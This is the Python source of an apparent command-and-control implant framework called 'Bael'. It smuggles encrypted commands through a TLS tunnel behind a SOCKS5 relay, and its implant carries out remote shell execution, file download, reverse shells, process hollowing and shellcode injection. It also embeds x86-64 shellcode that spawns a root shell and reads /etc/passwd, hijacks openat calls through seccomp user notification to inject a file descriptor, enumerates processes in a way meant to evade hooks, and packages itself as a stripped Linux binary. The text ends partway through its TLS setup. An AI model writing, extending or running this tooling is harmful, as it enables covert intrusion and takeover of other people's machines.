#!/usr/bin/env python3
import asyncio, ssl, argparse, random, os, logging, sys, socket, struct, threading, urllib.request, fcntl, time
import subprocess, shutil, base64, hashlib, socket, json, ctypes, string
from pathlib import Path
from collections import deque
from typing import Tuple, Optional, Deque, Any, Dict, List, Union

# ==================== SECCOMP STRUCTURES ===================

class SeccompData(ctypes.Structure):
    _fields_ = [
        ("nr", ctypes.c_int),
        ("arch", ctypes.c_uint32),
        ("instruction_pointer", ctypes.c_uint64),
        ("args", ctypes.c_uint64 * 6),
    ]

class SeccompNotif(ctypes.Structure):
    _fields_ = [
        ("id", ctypes.c_uint64),
        ("pid", ctypes.c_uint32),
        ("flags", ctypes.c_uint32),
        ("data", SeccompData),
    ]

class SeccompNotifResp(ctypes.Structure):
    _fields_ = [
        ("id", ctypes.c_uint64),
        ("flags", ctypes.c_uint32),
        ("error", ctypes.c_int32),
        ("val", ctypes.c_uint64),
    ]

class SeccompNotifAddfd(ctypes.Structure):
    _fields_ = [
        ("id", ctypes.c_uint64),
        ("flags", ctypes.c_uint32),
        ("srcfd", ctypes.c_uint32),
        ("newfd", ctypes.c_uint32),
        ("newfd_flags", ctypes.c_uint32),
    ]

try:
    from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.hkdf import HKDF
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

__version__ = "0.2.3"
__author__ = "J4ck3LSyN"

# ====================== LOGGING ======================
class BaelFormatter(logging.Formatter):
    COLORS = {
        logging.DEBUG: "\x1b[38;2;100;100;100m",
        logging.INFO: "\x1b[38;2;0;150;255m",
        logging.WARNING: "\x1b[33m",
        logging.ERROR: "\x1b[31m",
        logging.CRITICAL: "\x1b[41m\x1b[37m"
    }
    RESET = "\x1b[0m"

    def format(self, record):
        record.asctime = self.formatTime(record, self.datefmt)
        color = self.COLORS.get(record.levelno, self.COLORS[logging.INFO])
        return f"{self.COLORS[logging.DEBUG]}[{record.asctime}]{self.RESET} {color}{record.levelname:<8}{self.RESET} {record.getMessage()}"

logger = logging.getLogger("bael")
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
handler.setFormatter(BaelFormatter(datefmt="%H:%M:%S"))
logger.addHandler(handler)

SMUGGLE_MAGIC = b"\xBA\x31\xDE\xAD\xC0\xDE"
EMBEDDED_CERTS: Dict[str, str] = {}

# ====================== BAEL SHIELD ========================

class BaelShield:
    @staticmethod
    def _deriveKey(key: str) -> bytes:
        d1 = hashlib.sha512(key.encode()).digest()
        return d1 + hashlib.sha512(d1).digest()

    @classmethod
    def obfuscate(cls, data: bytes, key: str) -> str:
        k = cls._deriveKey(key)
        xor = bytes(a ^ b for a, b in zip(data, k * (len(data) // len(k) + 1)))
        return base64.b85encode(xor).decode("ascii")

    @classmethod
    def deobfuscate(cls, blob: str, key: str) -> bytes:
        data = base64.b85decode(blob)
        k = cls._deriveKey(key)
        return bytes(a ^ b for a, b in zip(data, k * (len(data) // len(k) + 1)))

    @classmethod
    def get_asset(cls, name: str, key: str) -> Optional[bytes]:
        if name in EMBEDDED_CERTS:
            return cls.deobfuscate(EMBEDDED_CERTS[name], key)
        return None

# ========================== SOCKS5 ==========================

class SocksRelay:
    """Diagnostic-focused relay - Priority: Make C2 (whoami) work"""

    def __init__(self):
        self.magic = SMUGGLE_MAGIC

    def _hexdump(self,data:bytes,length:int=16,prefix:str="") -> str:
        if not data: return "(empty)"
        lines = []
        for i in range(0, len(data), length):
            chunk = data[i:i + length]
            hStr = ' '.join(f'{b:02x}' for b in chunk)
            aStr = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
            lines.append(f"{prefix}{i:04x}  {hStr:<{length*3}}  {aStr}")
        return '\n'.join(lines)

    async def handle(self,socks_r, socks_w, tls_r, tls_w, engine=None):
        logger.info("<-> [SOCKS] New client handle started")
        try:
            # === SOCKS5 Handshake ===
            logger.debug("[SOCKS] Reading handshake...")
            header = await asyncio.wait_for(socks_r.read(2), timeout=5.0)
            logger.debug(f"[SOCKS] Handshake header: {header.hex() if header else None}")
            if len(header) < 2 or header[0] != 0x05:
                logger.warning("[x] Bad SOCKS handshake");return
            
            nmethods = header[1]
            methods = await socks_r.read(nmethods)
            
            s_user = engine.config.get("socks_user") if engine else None
            s_pass = engine.config.get("socks_pass") if engine else None

            if s_user and s_pass:
                if 0x02 not in methods:
                    logger.warning("[x] Client does not support Username/Password auth")
                    socks_w.write(b"\x05\xff")
                    await socks_w.drain(); return
                
                socks_w.write(b"\x05\x02")
                await socks_w.drain()
                
                # RFC 1929 Sub-negotiation
                sub_header = await asyncio.wait_for(socks_r.read(2), timeout=5.0)
                if not sub_header or sub_header[0] != 0x01: return
                
                ulen = sub_header[1]
                uname = (await socks_r.read(ulen)).decode()
                plen = (await socks_r.read(1))[0]
                passwd = (await socks_r.read(plen)).decode()

                if uname == s_user and passwd == s_pass:
                    socks_w.write(b"\x01\x00")
                    await socks_w.drain()
                    logger.info(f"[*] [SOCKS] Auth successful for user: {uname}")
                else:
                    logger.warning(f"[x] [SOCKS] Auth failed for user: {uname}")
                    socks_w.write(b"\x01\x01")
                    await socks_w.drain(); return
            else:
                if 0x00 not in methods:
                    socks_w.write(b"\x05\xff")
                    await socks_w.drain(); return
                socks_w.write(b"\x05\x00")
                await socks_w.drain()

            # === SOCKS Request (minimal) ===
            req = await asyncio.wait_for(socks_r.read(4), timeout=5.0)
            logger.debug(f"[SOCKS] Request: {req.hex() if req else None}")
            # Skip the rest of the request
            if len(req) >= 4 and req[3] == 0x01:await socks_r.read(4)   # IPv4
            elif len(req) >= 4 and req[3] == 0x03:
                alen = (await socks_r.read(1))[0];await socks_r.read(alen)
            await socks_r.read(2)  # port
            socks_w.write(b"\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00")
            await socks_w.drain()
            logger.info("[-] [SOCKS] Handshake completed successfully")
            # === Launch both directions with heavy logging ===
            logger.info("[RELAY] Starting bidirectional tasks...")
            socks_to_tls = self._socks_to_tls(socks_r, tls_w, engine)
            tls_to_socks = self._tls_to_socks(tls_r, socks_w, engine)
            await asyncio.gather(socks_to_tls, tls_to_socks, return_exceptions=True)

        except asyncio.TimeoutError as e: logger.error(f"[SOCKS] Timeout during handshake: {e}")
        except Exception as e:
            logger.error(f"[SOCKS] handle() crashed: {type(e).__name__}: {e}")
            import traceback
            logger.error(traceback.format_exc())
        finally:
            logger.info("[SOCKS] Handle shutting down")
            for w in (socks_w, tls_w):
                try:
                    if not w.is_closing(): w.close()
                except: pass

    async def _socks_to_tls(self, reader, writer, engine):
        logger.info("↗ [TASK] _socks_to_tls started")
        try:
            while True:
                # 1. Flush smuggled C2 responses to the server first
                while engine and engine.smuggleQueue:
                    smuggled = engine.smuggleQueue.popleft()
                    logger.info(f"↗ [SMUGGLE] Injecting queued C2 response ({len(smuggled)} bytes) into TLS stream")
                    writer.write(smuggled)
                    await writer.drain()
                # 2. Forward regular SOCKS traffic
                try:
                    # Use a short timeout so we can return to check the smuggleQueue
                    data = await asyncio.wait_for(reader.read(16384), timeout=0.1)
                    if not data:
                        logger.info("↗ [TASK] SOCKS client closed connection")
                        break
                    logger.debug(f"↗ SOCKS→TLS forwarded {len(data)} bytes")
                    writer.write(data)
                    await writer.drain()
                except asyncio.TimeoutError: continue
        except Exception as e: logger.error(f"↗ _socks_to_tls error: {e}")

    async def _tls_to_socks(self, reader, writer, engine):
        """This is the critical task for receiving whoami"""
        logger.info("↘ [TASK] _tls_to_socks STARTED ← This must appear!")
        buffer = bytearray()
        try:
            while True:
                logger.debug("↘ [TASK] Waiting for data from TLS...")
                data = await reader.read(16384)
                if not data:
                    logger.warning("↘ [TASK] TLS server closed connection")
                    break
                logger.info(f"↘ [TASK] RECEIVED {len(data)} bytes from TLS!")
                buffer.extend(data)
                if len(data) > 16:
                    logger.debug(f"↘ First 64 bytes:\n{self._hexdump(data[:64])}")
                # === C2 Frame Extraction ===
                while self.magic in buffer:
                    magic_idx = buffer.find(self.magic)
                    logger.info(f"[C2] SMUGGLE_MAGIC FOUND at offset {magic_idx}!")
                    if magic_idx > 0:
                        clean = bytes(buffer[:magic_idx])
                        logger.debug(f"Forwarding {len(clean)} clean bytes to SOCKS client")
                        writer.write(clean)
                        await writer.drain()
                    header_start = magic_idx + len(self.magic)
                    if len(buffer) < header_start + 2:
                        logger.warning("Incomplete header")
                        break
                    payload_len = int.from_bytes(buffer[header_start:header_start+2], "big")
                    frame_end = header_start + 2 + payload_len
                    if len(buffer) < frame_end:
                        logger.debug("Incomplete frame")
                        break
                    frame = bytes(buffer[magic_idx:frame_end])
                    logger.info(f"[C2] Processing frame ({len(frame)} bytes)")
                    if engine: await engine.c2.pCommand(frame)
                    else: logger.error("No engine!")
                    buffer = buffer[frame_end:]
                # Forward normal data
                if buffer:
                    writer.write(bytes(buffer))
                    await writer.drain()
                    buffer.clear()
        except Exception as e:
            logger.error(f"↘ _tls_to_socks CRASHED: {type(e).__name__}: {e}")
            import traceback
            logger.error(traceback.format_exc())

# ========================= CONSOLE ========================== 
class HiveMindConsole:
    def __init__(self, engine):
        self.engine = engine
        self.running = True
        self.prompt = "bael> "
        self.logFile = None

    async def run(self):
        print("\x1b[38;2;0;150;255mBael C2 Console v0.9.0 - Type 'help' for commands\x1b[0m")
        while self.running:
            try:
                cmd = await asyncio.get_event_loop().run_in_executor(None, input, self.prompt)
                if not cmd.strip():
                    self.prompt = "bael> "
                    continue
                if cmd.lower() in ["exit", "quit"]:
                    self._log(f"Console Session Ended")
                    self.running = False
                    break
                elif cmd.lower() == "help":
                    self.showHelp()
                elif cmd.startswith("/"):
                    self.consoleDirect(cmd)
                elif cmd.strip():
                    self._log(f"COMMAND: {cmd}")
                    self.sendCommand(cmd)
            except Exception as e:
                logger.error(f"Console error: {e}")

    def _log(self, text: str):
        if self.logFile:
            try:
                with open(self.logFile, "a", encoding="utf-8") as f:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"[{timestamp}] {text}\n")
            except Exception as e:
                logger.error(f"Logging failed: {e}")
                self.logFile = None

    def showHelp(self):
        hlist = [
            "Available Commands:",
            "--- Implant Commands ---",
            "ping                - Test connectivity",
            "whoami              - Get current user and hostname",
            "sysinfo             - Get detailed system and process info",
            "hardware            - Get CPU/Memory/Disk stats",
            "exec:<cmd>          - Execute a shell command (e.g., exec:ls -la)",
            "download:<url>      - Download a file to /tmp",
            "shell:<ip>:<port>   - Spawn a reverse shell",
            "hollow:<url>        - Trigger process hollowing (Windows)",
            "inject:<pid>:<b64>  - Inject shellcode into a PID (Windows)",
            "--- Console Commands ---",
            "/silent             - Silences the console prompt, Press a key to re-enable.",
            "/logging <file>     - Start logging session to file",
            "/logging off        - Stop active logging session"
        ]
        print("\n".join(hlist))

    def consoleDirect(self, command: str):
        if command == "/silent":
            self.prompt = ""
            print("[*] Console prompt silenced. Press Enter to restore.")
        elif command.startswith("/logging"):
            parts = command.split()
            if len(parts) > 1:
                action = parts[1].lower()
                if action == "off":
                    if self.logFile:
                        print(f"[*] Logging stopped. Session saved to {self.logFile}")
                        self.logFile = None
                    else:
                        print("[!] No active logging session found.")
                else:
                    self.logFile = parts[1]
                    self._log("Console Session Started")
                    print(f"[*] Logging started: {self.logFile}")
            else:
                print("[!] Usage: /logging <filename> OR /logging off")

    def sendCommand(self, command: str):
        try:
            # Ensure command format 'cmd:args' is respected for the C2 parser
            if ":" not in command:
                command = f"{command}:"
            
            # Use 'crypt' to match Bael.__init__ attribute name
            encrypted = self.engine.crypt.encrypt(command.encode())
            packet = SMUGGLE_MAGIC + len(encrypted).to_bytes(2, "big") + encrypted
            self.engine.smuggleQueue.append(packet)
            logger.info(f"Command sent: {command}")
        except Exception as e:
            logger.error(f"Failed to send command: {e}")
# ============================ C2 ============================

class C2:

    def __init__(self, crypt, engine, args):
        self.crypt = crypt
        self.engine = engine
        self.args = args
        self.logger = logger
        self.isroot = os.geteuid() == 0
        self.ptraceScope = self._getPTraceScope()
        self.injectConfig = {
            "path":"/tmp/baelC2" # Make dynamic
        }
        self.shellcode = None

        if self.args.c2_gsc:
            self._setupShellcode()
            cmd = self.args.c2_gsc
            if cmd in self.shellcode:
                sc = self.shellcode[cmd]
                self.logger.info(f"\n(C2.__init__) [+] Generated Shellcode for: {sc['name']}")
                self.logger.info(f"(C2.__init__) Hex: {sc['bytes'].hex()}")
                self.logger.info(f"(C2.__init__) C-style: " + "".join([f"\\x{b:02x}" for b in sc['bytes']]))
                if 'asm' in sc: self.logger.info(f"[*] ASM:\n{sc['asm']}")
            else: self.logger.info(f"(C2.__init__) Shellcode for '{cmd}' not found. Available: {', '.join(self.shellcode.keys())}")
            sys.exit(0)
        if self.args.c2_uringenum:
            self.logger.info(f"(C2.__init__) Initializing uRing Enum {json.dumps(self.ioURingEnumProc(), indent=2)}")
            sys.exit(0)

    # - seccomp

    class SeccompPoC:
        def __init__(self):
            """"""
            self.SECCOMP_SET_MODE_FILTER = 1
            self.SECCOMP_FILTER_FLAG_NEW_LISTENER = 1 << 0
            self.SECCOMP_IOCTL_NOTIF_RECV = 0xC0102100 | (ctypes.sizeof(ctypes.c_uint64) * 2)
            self.SECCOMP_IOCTL_NOTIF_SEND = 0xC0182101
            self.SECCOMP_IOCTL_NOTIF_ID_VALID = 0xC0082102
            self.SECCOMP_IOCTL_NOTIF_ADDFD = 0xC0182103
            self.SECCOMP_ADDFD_FLAG_SEND = 1 << 1
            self.SECCOMP_RET_USER_NOTIF = 0x7fff0000
            self.SECCOMP_RET_ALLOW = 0x7fff0000 | 0x0000
            self.SeccompData = SeccompData
            self.SeccompNotif = SeccompNotif
            self.SeccompNotifResp = SeccompNotifResp
            self.SeccompNotifAddfd = SeccompNotifAddfd

    
    # - shellcode operations 
    class ShellcodeGenerator:
        @staticmethod
        def custom(schex: str) -> bytes:
            return bytes.fromhex(schex.replace("\\x", "").replace(" ", ""))

    
    def _initSeccomp(self):
        self.logger.debug("(_initSeccomp) Initializing seccomp...")
        self.seccomp = self.SeccompPoC()
        try:
            global libc
            libc = ctypes.CDLL(None, use_errno=True)
        except Exception as e:
            self.logger.error(f"Failed to load libc for seccomp: {e}")


    # Core

    def _hexdump(self, data: bytes, length: int = 16) -> str:
        """Displays data in hex and ASCII format"""
        if not data: return ""
        lines = []
        for i in range(0, len(data), length):
            chunk = data[i:i + length]
            hex_val = ' '.join(f'{b:02x}' for b in chunk)
            ascii_val = ''.join(chr(b) if 32 <= b <= 126 else '.' for b in chunk)
            lines.append(f"{i:04x}  {hex_val:<47}  {ascii_val}")
        return "\n" + "\n".join(lines)

    async def pCommand(self, data: bytes):
        try:
            if not data or len(data) < len(SMUGGLE_MAGIC) + 10: return False
            logger.debug(f"[C2] Received frame: {len(data)} bytes{self._hexdump(data)}")
            if SMUGGLE_MAGIC not in data:
                logger.debug("[C2] Smuggle Magic Not Detected...")
                return False
            payload = data.split(SMUGGLE_MAGIC, 1)[1]
            if len(payload) < 2:
                logger.debug("[C2] Payload < 2/bytes...")
                return False
            length = int.from_bytes(payload[:2], "big")
            logger.debug("[C2] Payload length: %i bytes",length)
            if len(payload) < 2 + length: return False
            encrypted = payload[2:2 + length]
            plaintext = self.crypt.decrypt(encrypted)
            cmdData = plaintext.decode("utf-8", errors="ignore").strip()
            logger.info(f"[C2] Decrypted command: {cmdData}")
            if ":" not in cmdData: return False
            cmd, arg = cmdData.split(":", 1)
            cmd = cmd.lower().strip()
            arg = arg.strip()
            handlers = {
                "ping": lambda: b"PONG",
                "exec": lambda a: subprocess.getoutput(a).encode(errors='replace'),
                "sysinfo": lambda: self._get_sysinfo(),
                "whoami": lambda: self._get_whoami(),
                "hardware": lambda: self._get_hardware_info(),
                "download": lambda a: self._download(a),
                "shell": lambda a: self._spawnRevShell(a),
                "hollow": lambda a: self._pHollow(a),
                "inject": lambda a: self._pInject(a),
            }

            if cmd in handlers and self.args.mode in ["tun","client"]:
                handler = handlers[cmd]
                result = handler(arg) if cmd not in ["ping", "sysinfo", "whoami", "hardware"] else handler()

                if asyncio.iscoroutine(result):
                    result = await result

                if isinstance(result, (str, bytes)):
                    if isinstance(result, str):
                        result = result.encode()
                    encResp = self.crypt.encrypt(result)
                    resp = SMUGGLE_MAGIC + len(encResp).to_bytes(2, "big") + encResp
                    self.engine.smuggleQueue.append(resp)
                    logger.info(f"[C2] Command '{cmd}' executed, response queued")
                return True

        except Exception as e:
            logger.error(f"C2 command error: {e}")
            import traceback
            logger.error(traceback.format_exc())
        return False

    def _get_whoami(self):
        try:
            user = os.getenv('USER') or os.getenv('USERNAME') or "unknown"
            hostname = socket.gethostname()
            return f"User: {user}\nHostname: {hostname}\nPID: {os.getpid()}\n".encode()
        except:
            return b"whoami failed"

    def _get_hardware_info(self):
        info = []
        try:
            info.append(f"CPU: {subprocess.getoutput('cat /proc/cpuinfo | grep "model name" | head -1 | cut -d: -f2').strip()}")
            info.append(f"Memory: {subprocess.getoutput('free -h | grep Mem | awk \"{print $2}\"')}")
            info.append(f"Disk: {subprocess.getoutput('df -h / | tail -1 | awk \"{print $2}\"')}")
            info.append(f"Kernel: {os.uname().release}")
            info.append(f"Arch: {os.uname().machine}")
        except:
            info.append("Partial hardware info collected")
        return "\n".join(info).encode()

    def _get_sysinfo(self):
        try:
            node = os.uname().nodename if hasattr(os, "uname") else socket.gethostname()
            rStr = {
                "node": node,
                "pid": os.getpid(),
                "user": os.getenv('USER') or os.getenv('USERNAME'),
                "pwd": os.getcwd(),
                "kernel": os.uname().release if hasattr(os, "uname") else "N/A",
                "uptime": subprocess.getoutput("uptime -p"),
                "network_interfaces": subprocess.getoutput("ip addr | grep inet | awk '{print $2}'"),
                "top_processes": subprocess.getoutput("ps aux --sort=-%mem | head -n 15"),
                "cpu_cores": os.cpu_count(),
                "memory_stats": subprocess.getoutput("free -h | grep Mem | awk '{print $2, \"total,\", $3, \"used\"}'")
            }
            return json.dumps(rStr, indent=2).encode()
        except Exception as e:
            return f"Sysinfo collection failed: {e}".encode()

    # Memory functions
    def _getPTraceScope(self)->int:
        try:
            with open("/proc/sys/kernel/yama/ptrace_scope", "r") as f: 
                rout=int(f.read().strip())
                self.logger.debug("(_getPTraceScope) Read '/proc/sys/kernel/yama/ptrace_scope': %s", rout)
                return rout
        except Exception as e:
            self.logger.debug("(_getPTraceScope) Exception caught during operation (failed): return 1")
            return 1

    def _validateBasicAccess(self,pid:int)->bool:
        try:
            with open(f"/proc/{pid}/status", "r") as _: 
                self.logger.debug("(_validateBasicAccess) Validated basic access via `/proc/%s/status`", pid)
                return True
        except Exception as E:
            self.logger.debug("(_validateBasicAccess) Exception caught during operation (failed): return False")
            return False
    
    def _procPIDMap(self,pid:int)->List[Dict[str,Any]]:
        if not self._validateBasicAccess(pid): 
            self.logger.debug("(_procPIDMap) Basic access validation failed, returning empty list...")
            return []
        mappings = []
        try:
            with open(f"/proc/{pid}/maps", "r") as f:
                for l in f:
                    line_text = l.strip()
                    self.logger.debug(f"Processing line: {line_text}")
                    p = line_text.split(maxsplit=5)
                    if len(p) < 5: continue
                    addrRange, perms = p[0], p[1]
                    s,e = (int(x,16) for x in addrRange.split("-"))
                    m = {
                        "start":hex(s),
                        "end":hex(e),
                        "perms":perms,
                        "pathname": p[5] if len(p) > 5 else None,
                        "meta-line": line_text}
                    self.logger.debug(f"(_procPIDMap) Mapping: {str(m)}")
                    mappings.append(m)
        except Exception as E:
            pass
        finally: 
            self.logger.debug(f"(_procPIDMap) Final mappings: {str(mappings)}")
            return mappings

    def verifyPostInjection(self,pid:int)->Dict:
        if not pid: return {"verified":False}
        self.logger.debug(f"(verifyPostInjection) Verifying PID: {pid}")
        maps = self._procPIDMap(pid)
        rwx = [m for m in maps if "rwx" in m["perms"] or m.get("pathname","").startswith("/memfd")]
        rout = {
            "verified":True,
            "total":len(maps),
            "RWXMEMFD":len(rwx),
            "sample":maps[0] if maps else None,
            "maps":maps if maps else {},
            "hasMEMFD":any("/memfd" in str(m.get("pathname","")) for m in maps)}
        self.logger.debug(f"(verifyPostInjection) ROUT: {str(json.dumps(rout,indent=2))}")
        return rout

    def ioURingEnumProc(self)->Dict:
        """
        Demonstrates concept of io_uring-based stealth enumeration.
        In production, implement full io_uring queue with io_uring_prep_openat + io_uring_prep_read.
        This is a Python wrapper / simulation for lab visibility.
        Real stealth version uses liburing or raw syscalls.
        """
        self.logger.debug("io_uring stealth enum (concept - bypasses traditional read/getdents hooks)")
        procs = {}
        for pidStr in os.listdir("/proc"):
            self.logger.debug("> Processing PID: %s",pidStr)
            if not pidStr.isdigit(): continue
            pid = int(pidStr)
            if self._validateBasicAccess(pid):
                try:
                    with open(f"/proc/{pid}/comm", "r") as f:
                        procs[pid] = f.read().strip()
                except: pass
        rout = {
            "technique": "io_uring_sim (real: io_uring_prep_openat + read)",
            "visible_processes": len(procs),
            "samples": dict(list(procs.items())[:10])}
        self.logger.debug("(ioURingEnumProc) ROUT: %s",rout)
        return rout
    

    def retShellcode(self,name:str)->bytes:
        if self.shellcode == None: self._setupShellcode()
        if name not in self.shellcode: self.logger.warning("(retShellCode) %s not found in shellcodes.",name)
        return self.shellcode.get(name,b"").get("bytes",b"")

    def _pollFD(self,fd:int,timeout:int)->bool:
        """Simple poll helper"""
        self.logger.debug("(_pollFD) A")
        pfd = struct.pack("iH",fd,1) # POLLIN
        try:
            ready = libc.poll(ctypes.byref(ctypes.create_string_buffer(pfd)), 1, timeout)
            is_ready = ready > 0
            self.logger.debug("(_pollFD) fd: %s, ready: %s, is_ready: %s",fd,ready,is_ready)
            return is_ready
        except: return False
    
    def supervisor0(self,notifyFD:int,loaderFD:int):
        """Raw ctypes implementation of supervisor loop (technical)"""
        self.logger.debug("(supervisor0) Starting...")
        req = self.seccomp.SeccompNotif()
        resp = self.seccomp.SeccompNotifResp()
        addfd = self.seccomp.SeccompNotifAddfd()
        self.logger.debug("(supervisor0) req: %s, resp: %s, addfd: %s",req,resp,addfd)
        alrInj = False
        while True:
            # Poll simulation (simple select)
            ready = self._pollFD(notifyFD,timeout=500)
            if not ready: 
                self.logger.debug("(supervisor0) Not ready.");break
            # RECV
            if libc.ioctl(notifyFD, self.seccomp.SECCOMP_IOCTL_NOTIF_RECV, ctypes.byref(req)) < 0:
                if ctypes.get_errno() == 4: #EINTR
                    self.logger.debug("(supervisor0) EINTR")
                    continue
                break
            # ID Valid
            if libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_ID_VALID,ctypes.byref(ctypes.c_uint64(req.id))) < 0:
                self.logger.debug("(supervisor0) ID Valid failed")
                continue
            # HIJACK
            hijack = (req.data.nr in (257,437)) and not alrInj # openat / openat2
            resp.id = req.id
            resp.flags = 0
            resp.error = 0
            resp.val = 0
            if hijack and not alrInj:
                addfd.id = req.id
                addfd.flags = self.seccomp.SECCOMP_ADDFD_FLAG_SEND
                addfd.fd = loaderFD
                addfd.newfd = 0
                addfd.newfd_flags = 0
                ret = libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_ADDFD,ctypes.byref(addfd))
                if ret < 0:
                    resp.val = ret
                    alrInj = True
                    self.logger.debug("(supervisor0) Already injected...")
            else: resp.flags = 0x00000001  # CONTINUE flag
            self.logger.debug("(supervisor0) Sending response: %s",resp)
            libc.ioctl(notifyFD,self.seccomp.SECCOMP_IOCTL_NOTIF_SEND,ctypes.byref(resp))

    def _setupShellcode(self):
        self.shellcode = {
            "execve": {
                "name": "execve(/bin/sh)",
                "bytes": b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
                "length": 23
            },
            "setuid_execve": {
                "name": "setuid(0) + execve(/bin/sh)",
                "bytes": b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05",
                "length": 30
            },
            "read_etc_passwd": {
                "name": "read /etc/passwd",
                "bytes": b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x50\x48\xbb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x53\x48\x89\xe7\x6a\x02\x58\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x83\xec\x7f\x48\x89\xe6\xba\xff\x00\x00\x00\x0f\x05\x48\x89\xc2\x48\x31\xc0\x6a\x01\x58\x6a\x01\x5f\x0f\x05\x6a\x3c\x58\x0f\x05",
                "length": 82
            },
            "terminate": {
                "name": "terminate",
                "bytes": b"\x48\x31\xc0\xb0\x3c\x0f\x05",
                "length": 7
            }
        }
        self.logger.debug("(_setupShellcode) Shellcode setup complete...")

    def retShellcode(self, name: str) -> bytes:
        if self.shellcode is None: self._setupShellcode()
        if name not in self.shellcode:
            self.logger.warning("(retShellcode) %s not found in shellcodes.", name)
            return b""
        return self.shellcode.get(name, {}).get("bytes", b"")

    
# ========================== Crypto ==========================

class Crypto:
    def __init__(self, mKey: str):
        self.mKey = mKey.encode()
        self.logger = logger
        self._dKeys()

    def _dKeys(self, hkdf_len: int = 32, hkdf_salt: str = "BaelSalt", hkdf_info="C2"):
        if not CRYPTO_AVAILABLE:
            self.key = hashlib.sha256(self.mKey).digest()
            self.logger.debug("Cryptography modules not available, key digested.")
            return
        hkdf_salt = hkdf_salt.encode() if isinstance(hkdf_salt, str) else hkdf_salt
        hkdf_info = hkdf_info.encode() if isinstance(hkdf_info, str) else hkdf_info
        hkdf = HKDF(algorithm=hashes.SHA256(), length=hkdf_len, salt=hkdf_salt, info=hkdf_info)
        self.key = hkdf.derive(self.mKey)

    def encrypt(self, data: bytes) -> bytes:
        if not CRYPTO_AVAILABLE:
            k = self.key * (len(data) // len(self.key) + 1)
            return bytes(a ^ b for a, b in zip(data, k))
        nonce = os.urandom(12)
        chacha = ChaCha20Poly1305(self.key)
        return nonce + chacha.encrypt(nonce, data, None)

    def decrypt(self, data: bytes) -> bytes:
        if not CRYPTO_AVAILABLE:
            k = self.key * (len(data) // len(self.key) + 1)
            return bytes(a ^ b for a, b in zip(data, k))
        nonce = data[:12]
        chacha = ChaCha20Poly1305(self.key)
        return chacha.decrypt(nonce, data[12:], None)

# =========================== Core ===========================

class Bael:
    def __init__(self, config: dict, args: Any):
        self.config = config
        self.args = args
        self.server = config.get("mode") == "s"
        self.tmpDir = None
        self.tunFd = -1
        self.smuggleQueue: Deque[bytes] = deque()
        self.shieldKey = config.get("key", "tWQLh/dj.HI/B2P#4/m#L6h/tV")
        self.crypt = Crypto(self.shieldKey)
        self.c2 = C2(self.crypt, self, args)
        self.SSLCTX = self._setupPKI()
        self._loadSmuggleData()
        self.console = HiveMindConsole(self)
        logger.debug(f"PKI Status - Server: {self.server} | Key: {self.shieldKey[:8]}...")

    @staticmethod
    def build(name="bMTLSTUN0", buildPath=".baelBuild", verbose=False, bundleKeys=True):
        if sys.platform != "linux":
            logger.error("Build aborted: Optimized for Linux targets only.")
            return
        try:
            import PyInstaller.__main__
            build_path_obj = Path(buildPath)
            build_path_obj.mkdir(parents=True, exist_ok=True)
            dPath, wPath = build_path_obj / "dist", build_path_obj / "work"
            exclusions = ["tkinter", "tcl", "tk", "_tkinter", "unittest", "pydoc"]
            cArgs = [str(Path(sys.argv[0]).resolve()), '--onefile', f'--name={name}', '--clean', '--strip', '--distpath', str(dPath), '--workpath', str(wPath)]
            if verbose: cArgs.append('--log-level=DEBUG')
            for mod in exclusions: cArgs.extend(['--exclude-module', mod])
            PyInstaller.__main__.run(cArgs)
            logger.info(f"Build complete. Binary: {dPath}/{name}")
        except Exception as e: logger.error(f"Build failed: {e}")

    def _loadSmuggleData(self):
        if path := self.config.get("tData"):
            try:
                raw = Path(path).read_bytes()
                for i in range(0, len(raw), 180): 
                    self.smuggleQueue.append(raw[i:i+180])
            except Exception as e: logger.error(f"Smuggle Load Failed: {e}")

    def _setupPKI(self):
        purpose = ssl.Purpose.CLIENT_AUTH if self.server else ssl.Purpose.SERVER_AUTH
        ctx = ssl.create_default_context(purpose)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.check_hostname = False
        
        ca = BaelShield.get_asset("ca.crt", self.shieldKey)
        cert = BaelShield.get_asset("srv.crt" if self.server else "rmt.crt", self.shieldKey)
        key = BaelShield.get_asset("srv.key" if self.server else "rmt.key", self.shieldKey)
        
        # Filesystem fallback
        if not ca and hasattr(self.args, 'ca_crt') and os.path.exists(self.args.ca_crt): ca = Path(self.args.ca_crt).read_bytes()
        if self.server:
            if not cert and hasattr(self.args, 'sv_crt') and os.path.exists(self.args.sv_crt):cert = Path(self.args.sv_crt).read_bytes()
            if not key and hasattr(self.args, 'sv_key') and os.path.exists(self.args.sv_key):key = Path(self.args.sv_key).read_bytes()
        else:
            if not cert and hasattr(self.args, 'rm_crt') and os.path.exists(self.args.rm_crt):cert = Path(self.args.rm_crt).read_bytes()
            if not key and hasattr(self.args, 'rm_key') and os.path.exists(self.args.rm_key):key = Path(self.args.rm_key).read_bytes()

        if not all([ca, cert, key]):
            logger.critical("mTLS assets (CA, Cert, or Key) are missing. Secure connection is mandatory.")
            sys.exit(1)

        logger.info("[*] Full mTLS enabled with certificates")
        base = Path("/dev/shm") if Path("/dev/shm").exists() else Path("/tmp")
        self.tmpDir = base / f".bael_{os.getpid()}_{random.randint(10000, 99999)}"
        self.tmpDir.mkdir(parents=True, exist_ok=True)
        (self.tmpDir / "ca.crt").write_bytes(ca)
        (self.tmpDir / "cert.pem").write_bytes(cert)
        (self.tmpDir / "key.pem").write_bytes(key)
